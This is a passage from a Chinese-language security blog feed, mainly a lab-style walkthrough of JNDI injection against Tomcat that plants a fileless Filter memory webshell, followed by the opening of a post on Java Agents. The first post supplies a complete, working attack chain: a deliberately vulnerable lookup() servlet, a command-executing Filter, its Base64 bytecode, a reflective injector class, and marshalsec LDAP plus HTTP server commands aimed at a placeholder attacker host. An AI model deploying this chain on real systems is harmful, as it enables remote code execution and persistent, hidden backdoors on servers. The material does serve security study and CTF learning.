        <content type="html"><![CDATA[<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>通过JNDI可以使服务器远程下载类文件动态加载对象，如果该类文件是一个恶意的类对象，则可以达到无文件注入内存马的目的</p><br/><h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>JNDI（Java Naming and Directory Interface）Java 命名与目录接口，是 Java 平台的一个 API。JNDI 允许将资源（如数据库连接、Java 对象）存储在命名服务中。为了存储自定义对象，JNDI 引入了 <code>Reference</code> 类，当客户端调用 <code>lookup()</code> 查询一个 Reference 对象时，如果本地 classpath 找不到该类，Java 就会根据 <code>ClassFactoryLocation</code> 指定的 URL 去远程下载这个 <code>.class</code> 文件。攻击者通过控制 JNDI 查询的地址，诱导服务器从远程恶意服务器加载并实例化一个恶意 Java 类，从而实现远程代码执行（RCE）</p><br/><h2 id="JNDI注入内存马"><a href="#JNDI注入内存马" class="headerlink" title="JNDI注入内存马"></a>JNDI注入内存马</h2><p>接下来尝试使用JNDI注入Filter内存马</p><p>首先需要一个受害端，该端需要能够调用<code>lookup()</code>方法去加载ldap协议地址，我简单改了Tomcat默认的初始页面，使其能够接收一个<code>name</code>参数并查询</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (name != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                context.lookup(name);</span><br><span class="line">                response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于JNDI一次只能加载并实例化一次类对象，在这个对象中，我们需要获取<code>StandardContext</code>，并将恶意Filter注册进去，所以在无参构造方法中，我们还需要将恶意Filter动态加载出来</p><p>构建恶意Filter类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterShell</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            ProcessBuilder processBuilder;</span><br><span class="line">            processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            res.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">            res.getWriter().println(output);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            chain.doFilter(req, res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其该类导出为Base64字符串，便于在无参构造方法中还原并加载</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dump</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, IOException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;FilterShell&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = cc.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(encode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于JNDI注入时拿不到<code>Request</code>、<code>Response</code>对象，我们需要另一个方法获取<code>StandarContext</code>，对于Tomcat8.0版本，可以使用以下获取</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardRoot</span> <span class="variable">standardRoot</span> <span class="operator">=</span> (StandardRoot) webappClassLoaderBase.getResources();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardRoot.getContext();</span><br></pre></td></tr></table></figure><p>受害端加载的类对象如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectClass</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">StandardRoot</span> <span class="variable">standardRoot</span> <span class="operator">=</span> (StandardRoot) webappClassLoaderBase.getResources();</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardRoot.getContext();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sourceCode</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQAiwoAHQBPCABACwBQAFEHAFIKAAQATwcAUwcAVAgAVQgAVgoABgBXCgAGAFgHAFkHAFoKAFsAXAoADQBdCgAMAF4KAAwAXwoABABgCABhBwBiBwBjCgAVAGQIAGULAGYAZwsAZgBoCgBpAGoLAGsAbAcAbQcAbgcAbwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQANTEZpbHRlclNoZWxsOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAHABAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEABnJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBABJMamF2YS9sYW5nL1N0cmluZzsBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQAGb3V0cHV0AQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADnByb2Nlc3NCdWlsZGVyAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAANyZXEBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAANyZXMBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQAFY2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAANjbWQBAA1TdGFja01hcFRhYmxlBwBtBwBxBwByBwBzBwBUBwBSBwBTBwB0BwBZBwBiAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABBGaWx0ZXJTaGVsbC5qYXZhDAAfACAHAHEMAHUAdgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAHwB3DAB4AHkBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcAdAwAegB7DAAfAHwMAB8AfQwAfgB/DACAAIEBAAEKAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAfAIIBABd0ZXh0L2h0bWw7Y2hhcnNldD1VVEYtOAcAcgwAgwCEDACFAIYHAIcMAIgAiQcAcwwALACKAQALRmlsdGVyU2hlbGwBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQARamF2YS9sYW5nL1Byb2Nlc3MBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYAIQAcAB0AAQAeAAAABAABAB8AIAABACEAAAAvAAEAAQAAAAUqtwABsQAAAAIAIgAAAAYAAQAAAAYAIwAAAAwAAQAAAAUAJAAlAAAAAQAmACcAAgAhAAAANQAAAAIAAAABsQAAAAIAIgAAAAYAAQAAAAsAIwAAABYAAgAAAAEAJAAlAAAAAAABACgAKQABACoAAAAEAAEAKwABACwALQACACEAAAGhAAYACgAAAJkrEgK5AAMCADoEGQTGAIS7AARZtwAFOgW7AAZZBr0AB1kDEghTWQQSCVNZBRkEU7cACjoGGQa2AAs6B7sADFm7AA1ZGQe2AA63AA+3ABA6CBkItgARWToJxgATGQUZCbYAEhITtgASV6f/6KcADzoHuwAVWRkHtwAWvywSF7kAGAIALLkAGQEAGQW2ABqnAAstKyy5ABsDALEAAQA0AGsAbgAUAAMAIgAAAEIAEAAAAA8ACgAQAA8AEQAYABMANAAVADsAFgBQABgAWwAZAGsAHQBuABsAcAAcAHoAHgCCAB8AjQAgAJAAIQCYACMAIwAAAHAACwA7ADAALgAvAAcAUAAbADAAMQAIAFgAEwAyADMACQBwAAoANAA1AAcAGAB1ADYANwAFADQAWQA4ADkABgAAAJkAJAAlAAAAAACZADoAOwABAAAAmQA8AD0AAgAAAJkAPgA/AAMACgCPAEAAMwAEAEEAAAAwAAb/AFAACQcAQgcAQwcARAcARQcARgcARwcASAcASQcASgAA+QAaQgcASwv5ABUHACoAAAAGAAIAFAArAAEATAAgAAEAIQAAACsAAAABAAAAAbEAAAACACIAAAAGAAEAAAAnACMAAAAMAAEAAAABACQAJQAAAAEATQAAAAIATg==&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(sourceCode);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = (Class&lt;?&gt;) method.invoke(classLoader, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filterShell</span> <span class="operator">=</span> (Filter) clazz.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(<span class="string">&quot;FilterShell&quot;</span>);</span><br><span class="line">        filterDef.setFilter(filterShell);</span><br><span class="line">        filterDef.setFilterClass(filterShell.getClass().getName());</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(<span class="string">&quot;FilterShell&quot;</span>);</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        standardContext.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = (Map&lt;String, ApplicationFilterConfig&gt;) filterConfigsField.get(standardContext);</span><br><span class="line">        filterConfigs.put(<span class="string">&quot;FilterShell&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>InjectClass</code>编译为class文件，并托管在服务器上，我们需要在攻击者的服务器上搭建一个ldap服务，可以使用<code>marshalsec.jar</code>进行，在攻击者服务器执行以下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Djava.net.preferIPv4Stack=<span class="literal">true</span> -<span class="built_in">cp</span> marshalsec.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://XXX.XXX.XXX.XXX/#InjectClass&quot;</span> 8080</span><br></pre></td></tr></table></figure><p>还需要使用Python搭建一个http服务，用于提供class文件的下载服务</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 3389</span><br></pre></td></tr></table></figure><p>这两个服务中，marshalsec服务运行在8080端口，在受害端使用<code>ldap://XXX.XXX.XXX.XXX:8080/InjectClass</code>尝试访问ldap服务时，marshalsec会将运行http服务的3389端口告诉受害端，受害端从3389端口下载class文件</p><p>搭建完成服务后，在受害端的<code>/hello-servlet</code>路由传递<code>name=ldap://XXX.XXX.XXX.XXX:8080/InjectClass</code>参数</p><p>服务器能够接收受害端的class的下载请求</p><p><img src="/img/post/image-20260118153131270.png" alt="image-20260118153131270"></p><p>受害端的界面：</p><p><img src="/img/post/image-20260118151930268.png" alt="image-20260118151930268"></p><p>这个错误不成问题，由于JNDI 规范要求如果一个类作为 <code>ObjectFactory</code> 被引用，它必须实现 <code>javax.naming.spi.ObjectFactory</code> 接口，但是这发生在我们的恶意Filter实例化并注册之后，查看Tomcat的控制台确实打印了success字样</p><p><img src="/img/post/image-20260118151647617.png" alt="image-20260118151647617"></p><p>说明我们的内存马成功被受害端远程加载并注册了，在任意界面传入cmd参数，也能够成功执行命令</p><p><img src="/img/post/image-20260118151744484.png" alt="image-20260118151744484"></p><br/><h2 id="Tomcat9-0版本获取StandarContext"><a href="#Tomcat9-0版本获取StandarContext" class="headerlink" title="Tomcat9.0版本获取StandarContext"></a>Tomcat9.0版本获取<code>StandarContext</code></h2><p>在前面的tomcat8.0环境下，我们通过调用<code>WebappClassLoaderBase</code>的<code>getResources()</code>方法获取<code>StandardRoot</code>进而获取<code>StandarContext</code>，而在Tomcat9.0版本中，<code>getResources()</code>成为了弃用的方法，默认返回<code>null</code>值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line">    <span class="keyword">public</span> WebResourceRoot <span class="title function_">getResources</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而在Tomcat8.0环境下，该方法返回了<code>resources</code>字段</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> WebResourceRoot <span class="title function_">getResources</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.resources;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但其实在Tomcat9.0环境下，<code>WebappClassLoaderBase</code>也是有<code>resources</code>字段的，只不过不再能通过某一个方法直接获取，但是还可以通过反射取得</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">Class&lt;?&gt; webappClassLoaderBaseClass = webappClassLoaderBase.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">resources</span> <span class="operator">=</span>  webappClassLoaderBaseClass.getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">resources.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardRoot.getContext();</span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Agent及其内存马实现</title>
      <link href="/2026/01/16/Agent%E5%8F%8A%E5%85%B6%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/"/>
      <url>/2026/01/16/Agent%E5%8F%8A%E5%85%B6%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-Agent及其内存马实现"><a href="#Java-Agent及其内存马实现" class="headerlink" title="Java Agent及其内存马实现"></a>Java Agent及其内存马实现</h1><p>Java Agent 是一种可以在 Java 虚拟机（JVM）启动时或运行时加载的 Java 程序。它通过 <code>java.lang.instrument</code> 包提供的接口进行代码插桩，从而在 Java 应用程序的类加载和运行期间改变 Java 字节码</p><br/><h2 id="关于Agent"><a href="#关于Agent" class="headerlink" title="关于Agent"></a>关于Agent</h2><p>Agent的主要用途就是修改程序的字节码文件，通过外挂的jar包实现对程序jar包进行修改。Agent的运行方式有两种，一种通过在程序在通过java命令启动程序时通过加入<code>-javaagent</code>参数指定要加载的agent，例如</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -javaagent:self-agent.jar -jar app.jar</span><br></pre></td></tr></table></figure><p>另一种方式是在程序正常启动后再载入我们的agent，这也是通过agent实现内存马的主要途径</p><br/><h2 id="构建Agent并执行"><a href="#构建Agent并执行" class="headerlink" title="构建Agent并执行"></a>构建Agent并执行</h2><p>通过agent修改其他应用程序的字节码文件，需要一个包含修改逻辑的jar包，因此我们需要构建一个新的项目，再将其打包为jar文件，项目结构大致如下</p><p><img src="/img/post/image-20260115175908677.png" alt="image-20260115175908677"></p><h3 id="方法入口premain与agentmain"><a href="#方法入口premain与agentmain" class="headerlink" title="方法入口premain与agentmain"></a>方法入口premain与agentmain</h3><p>在<code>Agent</code>类中，通过定义<code>premain()</code>和<code>agentmain()</code>方法来指定jar包运行的入口，以上两个方法分别对应通过启动前挂载和启动后挂载两种方式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两方法的参数中， <code>agentArgs</code> 接收传递给 Agent 的参数，此处可以用该参数进行自定义逻辑。比如使用启动时挂载agent时执行以下命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -javaagent:self-agent.jar=admin -jar app.jar</span><br></pre></td></tr></table></figure><p>此时<code>agentArgs</code>接收的值将会是<code>&quot;admin&quot;</code>这个字符串</p><p><code>inst</code>参数接收 <code>Instrumentation</code> 类型的数据，这其实是一个工具对象，可以利用该对象进行一些类的重新定义操作或是转换操作</p><h3 id="元数据文件MANIFEST-MF"><a href="#元数据文件MANIFEST-MF" class="headerlink" title="元数据文件MANIFEST.MF"></a>元数据文件MANIFEST.MF</h3><p>该文件约束了jar包的一些行为，有点类似于配置文件，通过该文件可以指定jar包的入口类等等，该文件下可以有以下条目</p><table><thead><tr><th align="left">属性名</th><th align="left">说明</th><th align="left">取值</th><th align="left">默认值</th><th align="left">重要性</th></tr></thead><tbody><tr><td align="left"><strong>Premain-Class</strong></td><td align="left">静态加载 Agent 的入口类 JVM 启动时通过 <code>-javaagent</code> 参数加载</td><td align="left">完整类名，如：<code>Agent</code></td><td align="left">无</td><td align="left"><strong>必须</strong>（静态加载时）</td></tr><tr><td align="left"><strong>Agent-Class</strong></td><td align="left">动态加载 Agent 的入口类 通过 <code>VirtualMachine.attach()</code> 在运行时加载</td><td align="left">完整类名，如：<code>Agent</code></td><td align="left">无</td><td align="left"><strong>必须</strong>（动态加载时）</td></tr><tr><td align="left"><strong>Can-Redefine-Classes</strong></td><td align="left">Agent 能否重新定义（替换）已加载的类 通过 <code>Instrumentation.redefineClasses()</code></td><td align="left"><code>true</code> &#x2F; <code>false</code></td><td align="left"><code>false</code></td><td align="left"><strong>重要</strong></td></tr><tr><td align="left"><strong>Can-Retransform-Classes</strong></td><td align="left">Agent 能否转换（修改）已加载的类 通过 <code>Instrumentation.retransformClasses()</code></td><td align="left"><code>true</code> &#x2F; <code>false</code></td><td align="left"><code>false</code></td><td align="left"><strong>重要</strong></td></tr><tr><td align="left"><strong>Can-Set-Native-Method-Prefix</strong></td><td align="left">是否允许修改 Native 方法的前缀 用于拦截 Native 方法调用</td><td align="left"><code>true</code> &#x2F; <code>false</code></td><td align="left"><code>false</code></td><td align="left"><strong>高级功能</strong></td></tr></tbody></table><h3 id="构建配置pom-xml"><a href="#构建配置pom-xml" class="headerlink" title="构建配置pom.xml"></a>构建配置pom.xml</h3><p>通过配置<code>pom.xml</code>使我们的项目导出方式为<code>jar-with-dependencies</code>，还需要指定<code>MANIFEST.MF</code>的路径而不需要自动生成，主要是修改<code>&lt;build&gt;</code>标签下的内容</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.6.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">manifestFile</span>&gt;</span>src/main/resources/META-INF/MANIFEST.MF<span class="tag">&lt;/<span class="name">manifestFile</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span 